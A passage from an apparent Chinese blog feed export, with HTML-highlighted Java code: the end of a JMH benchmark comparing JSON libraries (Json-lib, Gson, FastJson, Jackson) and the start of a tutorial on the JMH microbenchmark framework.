class="token punctuation">.</span><span class="token function">include</span><span class="token punctuation">(</span>JsonSerializeBenchmark<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getSimpleName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">forks</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">warmupIterations</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Collection<span class="token operator">&lt;</span>RunResult<span class="token operator">></span> results <span class="token operator">=</span>  <span class="token keyword">new</span> <span class="token class-name">Runner</span><span class="token punctuation">(</span>opt<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ResultExporter<span class="token punctuation">.</span><span class="token function">exportResult</span><span class="token punctuation">(</span><span class="token string">"JSON序列化性能"</span><span class="token punctuation">,</span> results<span class="token punctuation">,</span> <span class="token string">"count"</span><span class="token punctuation">,</span> <span class="token string">"秒"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Benchmark</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">JsonLib</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> count<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            JsonLibUtil<span class="token punctuation">.</span><span class="token function">bean2Json</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Benchmark</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">Gson</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> count<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            GsonUtil<span class="token punctuation">.</span><span class="token function">bean2Json</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Benchmark</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">FastJson</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> count<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            FastJsonUtil<span class="token punctuation">.</span><span class="token function">bean2Json</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Benchmark</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">Jackson</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> count<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            JacksonUtil<span class="token punctuation">.</span><span class="token function">bean2Json</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Setup</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">prepare</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        List<span class="token operator">&lt;</span>Person<span class="token operator">></span> friends<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span>Person<span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        friends<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token function">createAPerson</span><span class="token punctuation">(</span><span class="token string">"小明"</span><span class="token punctuation">,</span>null<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        friends<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token function">createAPerson</span><span class="token punctuation">(</span><span class="token string">"Tony"</span><span class="token punctuation">,</span>null<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        friends<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token function">createAPerson</span><span class="token punctuation">(</span><span class="token string">"陈小二"</span><span class="token punctuation">,</span>null<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        p<span class="token operator">=</span><span class="token function">createAPerson</span><span class="token punctuation">(</span><span class="token string">"邵同学"</span><span class="token punctuation">,</span>friends<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@TearDown</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">shutdown</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> Person <span class="token function">createAPerson</span><span class="token punctuation">(</span>String name<span class="token punctuation">,</span>List<span class="token operator">&lt;</span>Person<span class="token operator">></span> friends<span class="token punctuation">)</span> <span class="token punctuation">{</span>        Person newPerson<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        newPerson<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>        newPerson<span class="token punctuation">.</span><span class="token function">setFullName</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FullName</span><span class="token punctuation">(</span><span class="token string">"zjj_first"</span><span class="token punctuation">,</span> <span class="token string">"zjj_middle"</span><span class="token punctuation">,</span> <span class="token string">"zjj_last"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        newPerson<span class="token punctuation">.</span><span class="token function">setAge</span><span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        List<span class="token operator">&lt;</span>String<span class="token operator">></span> hobbies<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span>String<span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        hobbies<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"篮球"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        hobbies<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"游泳"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        hobbies<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"coding"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        newPerson<span class="token punctuation">.</span><span class="token function">setHobbies</span><span class="token punctuation">(</span>hobbies<span class="token punctuation">)</span><span class="token punctuation">;</span>        Map<span class="token operator">&lt;</span>String<span class="token punctuation">,</span>String<span class="token operator">></span> clothes<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token operator">&lt;</span>String<span class="token punctuation">,</span> String<span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        clothes<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"coat"</span><span class="token punctuation">,</span> <span class="token string">"Nike"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        clothes<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"trousers"</span><span class="token punctuation">,</span> <span class="token string">"adidas"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        clothes<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"shoes"</span><span class="token punctuation">,</span> <span class="token string">"安踏"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        newPerson<span class="token punctuation">.</span><span class="token function">setClothes</span><span class="token punctuation">(</span>clothes<span class="token punctuation">)</span><span class="token punctuation">;</span>        newPerson<span class="token punctuation">.</span><span class="token function">setFriends</span><span class="token punctuation">(</span>friends<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> newPerson<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>说明一下，上面的代码中</p><pre class=" language-java"><code class="language-java">ResultExporter<span class="token punctuation">.</span><span class="token function">exportResult</span><span class="token punctuation">(</span><span class="token string">"JSON序列化性能"</span><span class="token punctuation">,</span> results<span class="token punctuation">,</span> <span class="token string">"count"</span><span class="token punctuation">,</span> <span class="token string">"秒"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>这个是我自己编写的将性能测试报告数据填充至Echarts图，然后导出png图片的方法，具体代码我就不贴了，参考我的 <a href="https://github.com/XuQianJin-Stars/JMHDemo.git">github </a>源码。</p><p>执行后的结果图：</p><p><a href="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/blob/master/medias/常用工具/JSON序列化性能.png"><img src="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/raw/master/medias/常用工具/JSON序列化性能.png" alt="img"></a></p><p>从上面的测试结果可以看出，序列化次数比较小的时候，Gson性能最好，当不断增加的时候到了100000，Gson明细弱于Jackson和FastJson， 这时候FastJson性能是真的牛，另外还可以看到不管数量少还是多，Jackson一直表现优异。而那个Json-lib简直就是来搞笑的。^_^</p><h3 id="JSON反序列化性能基准测试"><a href="#JSON反序列化性能基准测试" class="headerlink" title="JSON反序列化性能基准测试"></a>JSON反序列化性能基准测试</h3><pre class=" language-java"><code class="language-java"><span class="token annotation punctuation">@BenchmarkMode</span><span class="token punctuation">(</span>Mode<span class="token punctuation">.</span>SingleShotTime<span class="token punctuation">)</span><span class="token annotation punctuation">@OutputTimeUnit</span><span class="token punctuation">(</span>TimeUnit<span class="token punctuation">.</span>SECONDS<span class="token punctuation">)</span><span class="token annotation punctuation">@State</span><span class="token punctuation">(</span>Scope<span class="token punctuation">.</span>Benchmark<span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JsonDeserializeBenchmark</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">/**     * 反序列化次数参数     */</span>    <span class="token annotation punctuation">@Param</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"1000"</span><span class="token punctuation">,</span> <span class="token string">"10000"</span><span class="token punctuation">,</span> <span class="token string">"100000"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> count<span class="token punctuation">;</span>    <span class="token keyword">private</span> String jsonStr<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        Options opt <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">OptionsBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">include</span><span class="token punctuation">(</span>JsonDeserializeBenchmark<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getSimpleName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">forks</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">warmupIterations</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Collection<span class="token operator">&lt;</span>RunResult<span class="token operator">></span> results <span class="token operator">=</span>  <span class="token keyword">new</span> <span class="token class-name">Runner</span><span class="token punctuation">(</span>opt<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ResultExporter<span class="token punctuation">.</span><span class="token function">exportResult</span><span class="token punctuation">(</span><span class="token string">"JSON反序列化性能"</span><span class="token punctuation">,</span> results<span class="token punctuation">,</span> <span class="token string">"count"</span><span class="token punctuation">,</span> <span class="token string">"秒"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Benchmark</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">JsonLib</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> count<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            JsonLibUtil<span class="token punctuation">.</span><span class="token function">json2Bean</span><span class="token punctuation">(</span>jsonStr<span class="token punctuation">,</span> Person<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Benchmark</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">Gson</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> count<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            GsonUtil<span class="token punctuation">.</span><span class="token function">json2Bean</span><span class="token punctuation">(</span>jsonStr<span class="token punctuation">,</span> Person<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Benchmark</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">FastJson</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> count<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            FastJsonUtil<span class="token punctuation">.</span><span class="token function">json2Bean</span><span class="token punctuation">(</span>jsonStr<span class="token punctuation">,</span> Person<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Benchmark</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">Jackson</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> count<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            JacksonUtil<span class="token punctuation">.</span><span class="token function">json2Bean</span><span class="token punctuation">(</span>jsonStr<span class="token punctuation">,</span> Person<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Setup</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">prepare</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        jsonStr<span class="token operator">=</span><span class="token string">"{\"name\":\"邵同学\",\"fullName\":{\"firstName\":\"zjj_first\",\"middleName\":\"zjj_middle\",\"lastName\":\"zjj_last\"},\"age\":24,\"birthday\":null,\"hobbies\":[\"篮球\",\"游泳\",\"coding\"],\"clothes\":{\"shoes\":\"安踏\",\"trousers\":\"adidas\",\"coat\":\"Nike\"},\"friends\":[{\"name\":\"小明\",\"fullName\":{\"firstName\":\"xxx_first\",\"middleName\":\"xxx_middle\",\"lastName\":\"xxx_last\"},\"age\":24,\"birthday\":null,\"hobbies\":[\"篮球\",\"游泳\",\"coding\"],\"clothes\":{\"shoes\":\"安踏\",\"trousers\":\"adidas\",\"coat\":\"Nike\"},\"friends\":null},{\"name\":\"Tony\",\"fullName\":{\"firstName\":\"xxx_first\",\"middleName\":\"xxx_middle\",\"lastName\":\"xxx_last\"},\"age\":24,\"birthday\":null,\"hobbies\":[\"篮球\",\"游泳\",\"coding\"],\"clothes\":{\"shoes\":\"安踏\",\"trousers\":\"adidas\",\"coat\":\"Nike\"},\"friends\":null},{\"name\":\"陈小二\",\"fullName\":{\"firstName\":\"xxx_first\",\"middleName\":\"xxx_middle\",\"lastName\":\"xxx_last\"},\"age\":24,\"birthday\":null,\"hobbies\":[\"篮球\",\"游泳\",\"coding\"],\"clothes\":{\"shoes\":\"安踏\",\"trousers\":\"adidas\",\"coat\":\"Nike\"},\"friends\":null}]}"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@TearDown</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">shutdown</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>执行后的结果图：</p><p><a href="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/blob/master/medias/常用工具/JSON反序列化性能.png"><img src="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/raw/master/medias/常用工具/JSON反序列化性能.png" alt="img"></a></p><p>从上面的测试结果可以看出，反序列化的时候，Gson、Jackson和FastJson区别不大，性能都很优异，而那个Json-lib还是来继续搞笑的。</p><p>本文转载自:  <a href="https://www.xncoding.com/2018/01/09/java/jsons.html" target="_blank" rel="noopener">Java几种常用JSON库性能比较</a></p>]]></content>
      
      
      <categories>
          
          <category> 常用工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 开发工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java微基准测试框架JMH</title>
      <link href="/2018/12/28/chang-yong-gong-ju/java-wei-ji-zhun-ce-shi-kuang-jia-jmh/"/>
      <url>/2018/12/28/chang-yong-gong-ju/java-wei-ji-zhun-ce-shi-kuang-jia-jmh/</url>
      
        <content type="html"><![CDATA[<h2 id="Java微基准测试框架JMH"><a href="#Java微基准测试框架JMH" class="headerlink" title="Java微基准测试框架JMH"></a>Java微基准测试框架JMH</h2><p>JMH，即Java Microbenchmark Harness，这是专门用于进行代码的微基准测试的一套工具API。</p><p>JMH 由 OpenJDK/Oracle 里面那群开发了 Java 编译器的大牛们所开发 。何谓 Micro Benchmark 呢？ 简单地说就是在 method 层面上的 benchmark，精度可以精确到微秒级。</p><p>Java的基准测试需要注意的几个点：</p><ul><li>测试前需要预热。</li><li>防止无用代码进入测试方法中。</li><li>并发测试。</li><li>测试结果呈现。</li></ul><p>比较典型的使用场景：</p><ol><li>当你已经找出了热点函数，而需要对热点函数进行进一步的优化时，就可以使用 JMH 对优化的效果进行定量的分析。</li><li>想定量地知道某个函数需要执行多长时间，以及执行时间和输入 n 的相关性</li><li>一个函数有两种不同实现（例如JSON序列化/反序列化有Jackson和Gson实现），不知道哪种实现性能更好</li></ol><p>尽管 JMH 是一个相当不错的 Micro Benchmark Framework，但很无奈的是网上能够找到的文档比较少，而官方也没有提供比较详细的文档，对使用造成了一定的障碍。 但是有个好消息是官方的 <a href="http://hg.openjdk.java.net/code-tools/jmh/file/tip/jmh-samples/src/main/java/org/openjdk/jmh/samples/" target="_blank" rel="noopener">Code Sample</a> 写得非常浅显易懂， 推荐在需要详细了解 JMH 的用法时可以通读一遍——本文则会介绍 JMH 最典型的用法和部分常用选项。</p><h2 id="第一个例子"><a href="#第一个例子" class="headerlink" title="第一个例子"></a>第一个例子</h2><h3 id="添加maven依赖"><a href="#添加maven依赖" class="headerlink" title="添加maven依赖"></a>添加maven依赖</h3><p>如果使用maven项目，只需要添加如下依赖：</p><pre class=" language-xml"><code class="language-xml"><span class="token comment" spellcheck="true">&lt;!-- JMH--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.openjdk.jmh<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>jmh-core<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>${jmh.version}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.openjdk.jmh<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>jmh-generator-annprocess<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>${jmh.version}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>scope</span><span class="token punctuation">></span></span>provided<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>scope</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span></code></pre><h3 id="编写性能测试"><a href="#编写性能测试" class="headerlink" title="编写性能测试"></a>编写性能测试</h3><p>接下来我写一个比较字符串连接操作的时候，直接使用字符串相加和使用StringBuilder的append方式的性能比较测试：</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">/** * 比较字符串直接相加和StringBuilder的效率 * * @author XiongNeng * @version 1.0 * @since 2018/1/7 */</span><span class="token annotation punctuation">@BenchmarkMode</span><span class="token punctuation">(</span>Mode<span class="token punctuation">.</span>Throughput<span class="token punctuation">)</span><span class="token annotation punctuation">@Warmup</span><span class="token punctuation">(</span>iterations <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token annotation punctuation">@Measurement</span><span class="token punctuation">(</span>iterations <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">,</span> time <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">,</span> timeUnit <span class="token operator">=</span> TimeUnit<span class="token punctuation">.</span>SECONDS<span class="token punctuation">)</span><span class="token annotation punctuation">@Threads</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token annotation punctuation">@Fork</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token annotation punctuation">@OutputTimeUnit</span><span class="token punctuation">(</span>TimeUnit<span class="token punctuation">.</span>MILLISECONDS<span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">StringBuilderBenchmark</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Benchmark</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">testStringAdd</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        String a <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            a <span class="token operator">+=</span> i<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token function">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Benchmark</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">testStringBuilderAdd</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        StringBuilder sb <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            sb<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token function">print</span><span class="token punctuation">(</span>sb<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">print</span><span class="token punctuation">(</span>String a<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h3 id="执行方式"><a href="#执行方式" class="headerlink" title="执行方式"></a>执行方式</h3><p>这个代码里面有好多注解，你第一次见可能不知道什么意思。先不用管，我待会一一介绍。</p><p>我们来运行这个测试，运行JMH基准测试有多种方式，一个是生成jar文件执行， 一个是直接写main函数或写单元测试执行。</p><p>一般对于大型的测试，需要测试时间比较久，线程比较多的话，就需要去写好了丢到linux程序里执行， 不然本机执行很久时间什么都干不了了。</p><pre class=" language-shell"><code class="language-shell">mvn clean packagejava -jar target/benchmarks.jar</code></pre><p>先编译打包之后，然后执行就可以了。当然在执行的时候可以输入-h参数来看帮助。</p><p>另外如果对于一些小的测试，比如我写的上面这个小例子，在IDE里面就可以完成了，丢到linux上去太麻烦。 这时候可以在里面添加一个main函数如下：</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> RunnerException <span class="token punctuation">{</span>    Options options <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">OptionsBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">include</span><span class="token punctuation">(</span>StringBuilderBenchmark<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getSimpleName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string">"E:/Benchmark.log"</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">new</span> <span class="token class-name">Runner</span><span class="token punctuation">(</span>options<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>这里其实也比较简单，new个Options，然后传入要运行哪个测试，选择基准测试报告输出文件地址，然后通过Runner的run方法就可以跑起来了。</p><h3 id="报告结果"><a href="#报告结果" class="headerlink" title="报告结果"></a>报告结果</h3><p>我们跑一下这个基准测试，完成后打开<code>E:/Benchmark.log</code>，结果如下：</p><pre class=" language-java"><code class="language-java"># JMH version<span class="token operator">:</span> <span class="token number">1.20</span># VM version<span class="token operator">:</span> JDK <span class="token number">1.8</span><span class="token 